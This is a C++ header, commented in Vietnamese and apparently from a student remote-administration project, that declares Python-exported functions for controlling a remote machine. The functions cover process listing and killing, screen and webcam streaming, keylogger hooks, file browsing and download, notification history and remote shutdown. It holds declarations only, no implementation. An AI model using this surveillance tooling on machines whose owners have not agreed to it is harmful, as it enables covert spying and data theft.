#pragma once
#include <winsock2.h>
#include <string>
#include <vector>
#include <map>

#pragma comment(lib, "ws2_32.lib")

extern SOCKET clientSocket;
extern const int SERVER_PORT;

#ifndef DLLEXPORT
#define DLLEXPORT extern "C" __declspec(dllexport)
#endif

struct ProcessInfo {
    std::string name;
    std::string id;
    std::string threadCount;
};

typedef std::map<std::string, ProcessInfo> ProcessMap;

// Các hàm nội bộ
void connectToServer();
void sendCommand(std::string command);
void receiveTextResponse();               
ProcessMap receiveProcessList(bool isApp);
void receiveImageResponse();

// ==================================================
//      DANH SÁCH HÀM XUẤT KHẨU CHO PYTHON
// ==================================================
DLLEXPORT void InitWinsock();
DLLEXPORT bool ConnectToServer(const char* ip, int port);
DLLEXPORT void CloseConnection();

// Hàm gửi lệnh chung
DLLEXPORT void SendStringCmd(const char* cmd);

// Hàm lấy dữ liệu (Ghi ra file để Python đọc)
DLLEXPORT void GetAppList();
DLLEXPORT void GetProcessList();
DLLEXPORT void CaptureScreen();

// Hàm quay Video
DLLEXPORT void ReceiveVideoStream(int duration);
DLLEXPORT void ReceiveWebcamStream();

DLLEXPORT void KillProcess(const char* pid);    // Diệt theo ID
DLLEXPORT void StartProcess(const char* name);  // Mở theo Tên (VD: notepad)
DLLEXPORT void HookKeylog();        // Bắt đầu theo dõi phím
DLLEXPORT void UnhookKeylog();      // Dừng theo dõi
DLLEXPORT void GetKeylog();         // Lấy dữ liệu phím đã gõ -> Lưu ra file keylog.txt
DLLEXPORT void ShutdownServer();    // Tắt máy Server

DLLEXPORT void GetDrives();
DLLEXPORT void ExplorePath(const char* path);
DLLEXPORT void DownloadFile(const char* remotePath, const char* localPath);

DLLEXPORT void GetInstalledApps();
DLLEXPORT void GetNotificationHistory();